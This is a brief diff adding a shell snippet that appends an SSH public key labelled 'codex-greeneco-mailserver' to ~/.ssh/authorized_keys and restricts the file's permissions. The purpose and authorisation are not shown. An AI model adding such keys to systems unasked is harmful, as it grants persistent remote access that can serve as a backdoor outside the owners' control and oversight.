@@ -1,0 +1,3 @@
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMUoebyp6t3eOM31HXCV6Aj+NkDUqEejZbr0Xt2UNQcb codex-greeneco-mailserver' >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
